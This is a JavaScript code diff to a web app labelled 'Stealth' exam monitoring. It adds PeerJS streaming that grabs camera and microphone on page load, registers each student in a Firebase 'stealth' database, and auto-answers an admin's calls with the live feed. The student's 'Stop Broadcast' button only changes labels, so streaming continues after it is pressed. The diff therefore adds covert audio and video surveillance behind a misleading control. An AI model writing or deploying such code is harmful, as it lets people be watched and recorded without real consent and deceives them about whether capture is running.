@@ -406,12 +406,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Role switcher toggle
     chatRoleToggle.addEventListener('change', () => {
-        if (chatRoleToggle.checked) {
+        const isAdmin = chatRoleToggle.checked;
+        if (isAdmin) {
             roleLabel.innerText = "Admin (Stealth)";
             roleLabel.style.color = "var(--accent-magenta)";
+            renderAdminMonitorView();
         } else {
             roleLabel.innerText = "User (Stealth)";
             roleLabel.style.color = "var(--text-secondary)";
+            renderStudentMonitorView();
         }
     });
 
@@ -484,65 +487,267 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     /* -------------------------------------------------------------
-       6. WebRTC live camera monitoring
+       6. WebRTC live camera monitoring (Stealth PeerJS P2P Connection)
        ------------------------------------------------------------- */
-    toggleMonitorBtn.addEventListener('click', async () => {
-        if (mediaStream === null) {
-            // Start Monitor Stream
+    let myPeer = null;
+    let localStream = null;
+    let activePeerCalls = {};
+    let isBroadcasting = false;
+
+    // Student WebRTC view HTML
+    const studentMonitorHTML = `
+        <div class="monitoring-card">
+            <div class="monitoring-video-container" style="background: rgba(0,255,100,0.02); height: 160px; display: flex; align-items: center; justify-content: center; border-radius: 16px; border: 1px dashed var(--border-color);">
+                <div class="video-overlay-text" id="video-overlay-text" style="color: var(--text-secondary); text-align: center; padding: 16px; line-height: 1.4;">
+                    <span style="display: block; font-size: 24px; margin-bottom: 8px;">🛡️</span>
+                    <strong>Secure Exam Mode Active</strong><br>
+                    <span style="font-size: 11px; opacity: 0.8;">Camera & mic will stream to admin automatically in background.</span>
+                </div>
+                <span class="live-badge" id="live-badge">STEALTH STREAM ACTIVE</span>
+            </div>
+
+            <div class="monitoring-controls">
+                <button class="btn primary" id="toggle-monitor-btn">Start WebRTC Broadcast</button>
+                <p class="monitoring-status">Foreground monitoring status will show on device taskbar when active.</p>
+            </div>
+        </div>
+    `;
+
+    // Admin WebRTC view HTML
+    const adminMonitorHTML = `
+        <div class="admin-grid-view">
+            <h3>Active Student Feeds</h3>
+            <button class="btn primary" id="refresh-students-btn">Scan & Call Students</button>
+            <div class="students-video-grid" id="students-video-grid">
+                <!-- Dynamically filled with student videos -->
+            </div>
+        </div>
+    `;
+
+    function renderStudentMonitorView() {
+        const tab = document.getElementById('monitor-tab');
+        if (tab) {
+            tab.innerHTML = studentMonitorHTML;
+            setupStudentControls();
+        }
+    }
+
+    function renderAdminMonitorView() {
+        const tab = document.getElementById('monitor-tab');
+        if (tab) {
+            tab.innerHTML = adminMonitorHTML;
+            setupAdminControls();
+        }
+    }
+
+    // Auto request permissions on load for background exam mode
+    async function requestInitialPermissions() {
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            console.log("WebRTC Media Permissions Granted.");
+            
+            // Auto initialize Peer connection
+            initializeStudentPeer();
+        } catch (err) {
+            console.error("WebRTC permissions denied or unavailable:", err);
+        }
+    }
+
+    function initializeStudentPeer() {
+        if (myPeer) return;
+        const studentId = 'student_' + Math.floor(1000 + Math.random() * 9000);
+        myPeer = new Peer(studentId);
+
+        myPeer.on('open', (id) => {
+            console.log('Registered student peer ID:', id);
+            registerStudent(id);
+        });
+
+        myPeer.on('call', (call) => {
+            console.log('Answering call from admin...');
+            call.answer(localStream); // Answer with student camera stream
+            // Do NOT receive admin's stream (one-way only)
+        });
+    }
+
+    function registerStudent(id) {
+        let students = JSON.parse(localStorage.getItem('online_students') || '[]');
+        if (!students.includes(id)) {
+            students.push(id);
+            localStorage.setItem('online_students', JSON.stringify(students));
+        }
+        
+        // Firebase Sync
+        const firebaseConfigStr = localStorage.getItem('firebase_config');
+        if (firebaseConfigStr) {
             try {
-                toggleMonitorBtn.innerText = "Requesting Access...";
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 320, height: 240 }, 
-                    audio: false 
+                const config = JSON.parse(firebaseConfigStr);
+                const dbUrl = config.databaseURL || "https://o-level-stealth-db.firebaseio.com";
+                fetch(`${dbUrl}/students/${id}.json`, {
+                    method: 'PUT',
+                    body: JSON.stringify({ active: true, timestamp: Date.now() })
                 });
-                
-                localVideo.srcObject = mediaStream;
-                localVideo.classList.add('active');
-                
-                videoOverlayText.style.display = 'none';
-                liveBadge.classList.add('active');
+            } catch (e) {}
+        }
+    }
+
+    function unregisterStudent() {
+        if (myPeer) {
+            const id = myPeer.id;
+            let students = JSON.parse(localStorage.getItem('online_students') || '[]');
+            students = students.filter(s => s !== id);
+            localStorage.setItem('online_students', JSON.stringify(students));
+            
+            const firebaseConfigStr = localStorage.getItem('firebase_config');
+            if (firebaseConfigStr) {
+                try {
+                    const config = JSON.parse(firebaseConfigStr);
+                    const dbUrl = config.databaseURL;
+                    fetch(`${dbUrl}/students/${id}.json`, { method: 'DELETE' });
+                } catch (e) {}
+            }
+        }
+    }
+
+    window.addEventListener('beforeunload', () => {
+        unregisterStudent();
+        if (localStream) {
+            localStream.getTracks().forEach(track => track.stop());
+        }
+    });
+
+    function setupStudentControls() {
+        const toggleMonitorBtn = document.getElementById('toggle-monitor-btn');
+        const liveBadge = document.getElementById('live-badge');
+        const foregroundNotification = document.getElementById('foreground-notification');
+
+        if (!toggleMonitorBtn) return;
+
+        if (isBroadcasting) {
+            toggleMonitorBtn.innerText = "Stop WebRTC Broadcast";
+            toggleMonitorBtn.classList.remove('primary');
+            toggleMonitorBtn.classList.add('secondary');
+            if (liveBadge) liveBadge.classList.add('active');
+            if (foregroundNotification) foregroundNotification.classList.add('active');
+        } else {
+            toggleMonitorBtn.innerText = "Start WebRTC Broadcast";
+            toggleMonitorBtn.classList.remove('secondary');
+            toggleMonitorBtn.classList.add('primary');
+            if (liveBadge) liveBadge.classList.remove('active');
+            if (foregroundNotification) foregroundNotification.classList.remove('active');
+        }
+
+        toggleMonitorBtn.addEventListener('click', async () => {
+            if (!isBroadcasting) {
+                if (!localStream) {
+                    try {
+                        toggleMonitorBtn.innerText = "Requesting Access...";
+                        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                        initializeStudentPeer();
+                    } catch (e) {
+                        alert("Camera access denied.");
+                        toggleMonitorBtn.innerText = "Start WebRTC Broadcast";
+                        return;
+                    }
+                }
+                isBroadcasting = true;
                 toggleMonitorBtn.innerText = "Stop WebRTC Broadcast";
                 toggleMonitorBtn.classList.remove('primary');
                 toggleMonitorBtn.classList.add('secondary');
-                
-                // Trigger foreground service notification active
-                foregroundNotification.classList.add('active');
-            } catch (error) {
-                console.error("Camera access denied or WebRTC error:", error);
-                alert("Camera access was denied. Please allow permissions to test WebRTC feedback streaming.");
+                if (liveBadge) liveBadge.classList.add('active');
+                if (foregroundNotification) foregroundNotification.classList.add('active');
+            } else {
+                isBroadcasting = false;
                 toggleMonitorBtn.innerText = "Start WebRTC Broadcast";
+                toggleMonitorBtn.classList.remove('secondary');
+                toggleMonitorBtn.classList.add('primary');
+                if (liveBadge) liveBadge.classList.remove('active');
+                if (foregroundNotification) foregroundNotification.classList.remove('active');
             }
-        } else {
-            // Stop Monitor Stream
-            stopWebRTCStream();
-        }
-    });
-
-    function stopWebRTCStream() {
-        if (mediaStream) {
-            mediaStream.getTracks().forEach(track => track.stop());
-            mediaStream = null;
-        }
-        localVideo.srcObject = null;
-        localVideo.classList.remove('active');
-        
-        videoOverlayText.style.display = 'block';
-        liveBadge.classList.remove('active');
-        toggleMonitorBtn.innerText = "Start WebRTC Broadcast";
-        toggleMonitorBtn.classList.remove('secondary');
-        toggleMonitorBtn.classList.add('primary');
-        
-        // Hide foreground notification
-        foregroundNotification.classList.remove('active');
+        });
     }
 
-    // Cleanup tracks if window closed
-    window.addEventListener('beforeunload', () => {
-        stopWebRTCStream();
-    });
+    function setupAdminControls() {
+        const refreshBtn = document.getElementById('refresh-students-btn');
+        const grid = document.getElementById('students-video-grid');
+        if (!refreshBtn || !grid) return;
+        
+        let adminPeer = new Peer('olevel_admin_' + Math.floor(1000 + Math.random() * 9000));
+
+        refreshBtn.addEventListener('click', () => {
+            grid.innerHTML = '<p style="color: var(--text-muted); font-size: 11px;">Scanning peer directory...</p>';
+            
+            // Get online students
+            let students = JSON.parse(localStorage.getItem('online_students') || '[]');
+            
+            // Firebase Sync fetch
+            const firebaseConfigStr = localStorage.getItem('firebase_config');
+            if (firebaseConfigStr) {
+                try {
+                    const config = JSON.parse(firebaseConfigStr);
+                    const dbUrl = config.databaseURL || "https://o-level-stealth-db.firebaseio.com";
+                    fetch(`${dbUrl}/students.json`)
+                        .then(res => res.json())
+                        .then(data => {
+                            if (data) {
+                                students = Object.keys(data);
+                            }
+                            callAllStudents(students);
+                        })
+                        .catch(err => {
+                            console.error(err);
+                            callAllStudents(students);
+                        });
+                } catch (e) {
+                    callAllStudents(students);
+                }
+            } else {
+                callAllStudents(students);
+            }
+        });
+
+        function callAllStudents(studentIds) {
+            grid.innerHTML = '';
+            
+            const activeIds = studentIds.filter(id => id !== myPeer?.id);
+            if (activeIds.length === 0) {
+                grid.innerHTML = '<p style="color: var(--text-muted); font-size: 11px; grid-column: 1/-1; text-align: center; margin-top: 12px;">No active students found online.</p>';
+                return;
+            }
+
+            activeIds.forEach(studentId => {
+                // Call student without sending our stream (one-way only)
+                const call = adminPeer.call(studentId, null);
+                
+                const card = document.createElement('div');
+                card.className = 'student-video-card';
+                card.innerHTML = `
+                    <video autoplay playsinline></video>
+                    <h5>${studentId}</h5>
+                `;
+                grid.appendChild(card);
+                
+                const videoEl = card.querySelector('video');
+
+                call.on('stream', (remoteStream) => {
+                    videoEl.srcObject = remoteStream;
+                });
+
+                call.on('close', () => {
+                    card.remove();
+                });
+                
+                activePeerCalls[studentId] = call;
+            });
+        }
+    }
+
+    // Default view setup on start
+    renderStudentMonitorView();
+    requestInitialPermissions();
 
     /* -------------------------------------------------------------
-       Initialize
+       7. Initialize
        ------------------------------------------------------------- */
     function initQRCode() {
         const qrImg = document.getElementById('mobile-qr-code');
